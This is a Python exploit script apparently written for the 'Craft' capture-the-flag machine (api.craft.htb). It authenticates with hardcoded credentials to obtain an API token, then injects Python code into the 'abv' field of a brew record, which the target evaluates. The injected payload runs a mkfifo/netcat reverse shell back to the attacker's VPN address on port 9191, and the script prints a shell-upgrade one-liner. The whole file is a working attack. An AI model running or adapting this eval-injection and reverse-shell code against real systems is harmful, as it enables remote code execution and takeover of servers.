#!/usr/bin/python3
import requests, json
import socket, subprocess
import netifaces as ni
from sys import exit
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Craft(object):
    def __init__(self, proxies='https://127.0.0.1:8080'):
        self.brew_api = 'https://api.craft.htb/api/brew/'
        self.login_api = 'https://api.craft.htb/api/auth/login'
        self.proxies = {'https':proxies}
        self.token = self.getToken()
        self.insertBrew()
        #self.getBrews()

    def getToken(self):
        r = requests.get(self.login_api, auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
        json_response = json.loads(r.text)
        token = json_response['token']

        return token

    def insertBrew(self):
        headers = {
            'X-Craft-API-Token': self.token,
            'Content-Type': 'application/json' }

        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} 9191 >/tmp/f".format(ip)

        data = {
                "name":"artikrh",
                "brewer":"artikrh",
                "style":"artikrh",
                "abv":"""__import__('os').popen('{}').read()""".format(cmd) }
                # if eval('%s > 1' % request.json['abv']):

        try:
            r = requests.post(self.brew_api, headers=headers, json=data, timeout=2, verify=False) # proxies=self.proxies
        except:
            #subprocess.call(['nc -lvnp 9191'], shell=True, stderr=subprocess.STDOUT)
            print("""[*] Execute for PTY: python -c 'import pty;pty.spawn("/bin/sh");'""")
            pass

    def getBrews(self):
        r = requests.get(self.brew_api, verify=False)
        json_response = json.loads(r.text)
        print(json_response)

if __name__ == '__main__':
    try:
        ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        socket.gethostbyname('api.craft.htb')
    except socket.error:
        print('[*] Missing api.craft.htb entry in /etc/hosts. Exiting...')
        exit()
    except:
        print('[*] Failed to retrieve tun0 IP address. Is your VPN on?')
        exit()

    Craft()
